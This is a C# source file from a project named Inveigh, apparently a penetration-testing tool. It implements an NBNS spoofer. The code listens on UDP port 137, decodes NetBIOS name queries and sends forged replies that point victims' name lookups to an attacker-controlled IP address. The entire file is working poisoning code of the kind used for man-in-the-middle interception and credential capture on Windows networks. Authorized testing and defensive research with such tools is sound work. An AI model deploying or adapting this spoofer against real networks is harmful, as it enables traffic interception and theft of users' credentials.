using System;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace Inveigh
{
    class NBNS
    {

        public static void NBNSListener(string IP)
        {
            IPAddress destinationIPAddress = IPAddress.Parse(IP);
            IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.Broadcast, 137);
            UdpClient udpClient = UDP.UDPListener("NBNS", "IPv4", 137);

            while (!Program.exitInveigh)
            {

                try
                {
                    byte[] udpPayload = udpClient.Receive(ref ipEndPoint);
                    NBNSReply("listener", null, udpPayload, null, destinationIPAddress, ipEndPoint, udpClient);
                }
                catch (Exception ex)
                {
                    Program.outputList.Add(String.Format("[!] [{0}] NBNS spoofer error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }

            }

        }

        public static void NBNSReply(string method, byte[] sourcePortData, byte[] payload, IPAddress sourceIPAddress, IPAddress destinationIPAddress, IPEndPoint ipEndPoint, UdpClient udpClient)
        {
            int sourcePortNumber = 0;
            string sourceIP = "";
            string responseStatus = "-";

            if (String.Equals(method, "sniffer"))
            {
                int udpSourcePortNumber = Util.DataToUInt16(sourcePortData);
                sourceIP = sourceIPAddress.ToString();
            }
            else
            {
                sourcePortNumber = ipEndPoint.Port;
                sourcePortData = Util.IntToByteArray2(sourcePortNumber);
                sourceIPAddress = ipEndPoint.Address;
                sourceIP = sourceIPAddress.ToString();
            }

            byte[] questionsAnswerRRs = new byte[4];
            Buffer.BlockCopy(payload, 4, questionsAnswerRRs, 0, 4);
            byte[] additionalRRs = new byte[2];
            Buffer.BlockCopy(payload, 10, additionalRRs, 0, 2);

            if (String.Equals(BitConverter.ToString(questionsAnswerRRs), "00-01-00-00") && !String.Equals(BitConverter.ToString(additionalRRs), "00-01"))
            {
                byte[] requestType = new byte[2];
                Buffer.BlockCopy(payload, 43, requestType, 0, 2);
                string nbnsQueryType = NBNSQueryType(requestType);
                byte[] type = new byte[1];
                Buffer.BlockCopy(payload, 47, type, 0, 1);
                byte[] request = new byte[payload.Length - 20];
                Buffer.BlockCopy(payload, 13, request, 0, request.Length);
                string requestHost = BytesToNBNSQuery(request);
                string responseMessage = Util.CheckRequest("NBNS", requestHost, sourceIP, Program.argIP, nbnsQueryType, Program.argNBNSTypes, Program.enabledNBNS);

                if (Program.enabledNBNS && String.Equals(responseMessage, "response sent"))
                {

                    if (Array.Exists(Program.argNBNSTypes, element => element == nbnsQueryType) && !String.Equals(BitConverter.ToString(type), "21"))
                    {
                        responseStatus = "-";
                        byte[] response = GetNBNSResponse(method, Program.argNBNSTTL, Program.spooferIPData, sourcePortData, payload);

                        if (String.Equals(method, "sniffer"))
                        {
                            UDP.UDPSnifferClient("IPv4", 0, sourceIPAddress, sourcePortNumber, response);
                        }
                        else
                        {
                            UDP.UDPListenerClient(sourceIPAddress, 137, udpClient, response);
                        }

                    }
                    else if (String.Equals(BitConverter.ToString(type), "21"))
                    {
                        responseMessage = "NBSTAT request";
                    }
                    else
                    {
                        responseMessage = "NBNS type disabled";
                    }

                }

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[{0}] [{1}] NBNS request for {2}<{3}> from {4} [{5}]", responseStatus, DateTime.Now.ToString("s"), requestHost, nbnsQueryType, sourceIPAddress, responseMessage));
                }

            }

        }

        public static string BytesToNBNSQuery(byte[] field)
        {
            string nbnsUTF8 = BitConverter.ToString(field);
            nbnsUTF8 = nbnsUTF8.Replace("-00", String.Empty);
            string[] nbnsArray = nbnsUTF8.Split('-');
            string nbnsQuery = "";

            foreach (string character in nbnsArray)
            {
                nbnsQuery += new String(Convert.ToChar(Convert.ToInt16(character, 16)), 1);
            }
            
            if (nbnsQuery.Contains("CA"))
            {
                nbnsQuery = nbnsQuery.Substring(0, nbnsQuery.IndexOf("CA"));
            }

            int i = 0;
            string nbnsQuerySubtracted = "";

            do
            {
                byte nbnsQuerySub = (byte)Convert.ToChar(nbnsQuery.Substring(i, 1));
                nbnsQuerySub -= 65;
                nbnsQuerySubtracted += Convert.ToString(nbnsQuerySub, 16);
                i++;
            }
            while (i < nbnsQuery.Length);

            i = 0;
            string nbnsQueryHost = "";

            do
            {
                nbnsQueryHost += (Convert.ToChar(Convert.ToInt16(nbnsQuerySubtracted.Substring(i, 2), 16)));
                i += 2;
            }
            while (i < nbnsQuerySubtracted.Length - 1);

            if (nbnsQuery.StartsWith("ABAC") && nbnsQuery.EndsWith("AC"))
            {
                nbnsQueryHost = nbnsQueryHost.Substring(2);
                nbnsQueryHost = nbnsQueryHost.Substring(0, nbnsQueryHost.Length - 1);
                nbnsQueryHost = String.Concat("<01><02>", nbnsQueryHost, "<02>");
            }

            return nbnsQueryHost;
        }

        public static string NBNSQueryType(byte[] field)
        {
            string nbnsQuery = BitConverter.ToString(field);
            string nbnsQueryType = "";

            switch (nbnsQuery)
            {
                case "41-41":
                    nbnsQueryType = "00";
                    break;

                case "41-42":
                    nbnsQueryType = "01";
                    break;

                case "41-43":
                    nbnsQueryType = "02";
                    break;

                case "41-44":
                    nbnsQueryType = "03";
                    break;

                case "43-41":
                    nbnsQueryType = "20";
                    break;

                case "42-4C":
                    nbnsQueryType = "1B";
                    break;

                case "42-4D":
                    nbnsQueryType = "1C";
                    break;

                case "42-4E":
                    nbnsQueryType = "1D";
                    break;

                case "42-4F":
                    nbnsQueryType = "1E";
                    break;

            }

            return nbnsQueryType;
        }

        public static byte[] GetNBNSResponse(string type, string nbnsTTL, byte[] spooferIPData, byte[] udpSourcePort, byte[] udpPayload)
        {
            byte[] ttlNBNS = BitConverter.GetBytes(Int32.Parse(nbnsTTL));
            Array.Reverse(ttlNBNS);
            byte[] nbnsTransactionID = new byte[2];
            Buffer.BlockCopy(udpPayload, 0, nbnsTransactionID, 0, 2);
            byte[] nbnsRequestType = new byte[2];
            Buffer.BlockCopy(udpPayload, 43, nbnsRequestType, 0, 2);
            string nbnsQueryType = NBNS.NBNSQueryType(nbnsRequestType);
            byte[] nbnsType = new byte[1];
            Buffer.BlockCopy(udpPayload, 47, nbnsType, 0, 1);
            byte[] nbnsRequest = new byte[udpPayload.Length - 20];
            Buffer.BlockCopy(udpPayload, 13, nbnsRequest, 0, nbnsRequest.Length);
            string nbnsRequestHost = NBNS.BytesToNBNSQuery(nbnsRequest);

            MemoryStream nbnsMemoryStream = new MemoryStream();

            if (String.Equals(type, "sniffer"))
            {
                nbnsMemoryStream.Write((new byte[2] { 0x00, 0x89 }), 0, 2);
                nbnsMemoryStream.Write(udpSourcePort, 0, 2);
                nbnsMemoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                nbnsMemoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
            }

            nbnsMemoryStream.Write(nbnsTransactionID, 0, nbnsTransactionID.Length);
            nbnsMemoryStream.Write((new byte[11] { 0x85, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x20 }), 0, 11);
            nbnsMemoryStream.Write(nbnsRequest, 0, nbnsRequest.Length);
            nbnsMemoryStream.Write(nbnsRequestType, 0, 2);
            nbnsMemoryStream.Write((new byte[5] { 0x00, 0x00, 0x20, 0x00, 0x01 }), 0, 5);
            nbnsMemoryStream.Write(ttlNBNS, 0, 4);
            nbnsMemoryStream.Write((new byte[4] { 0x00, 0x06, 0x00, 0x00 }), 0, 4);
            nbnsMemoryStream.Write(spooferIPData, 0, spooferIPData.Length);

            if (String.Equals(type, "sniffer"))
            {
                nbnsMemoryStream.Position = 4;
                nbnsMemoryStream.Write(Util.IntToByteArray2((int)nbnsMemoryStream.Length), 0, 2);
            }

            return nbnsMemoryStream.ToArray();
        }

    }

}
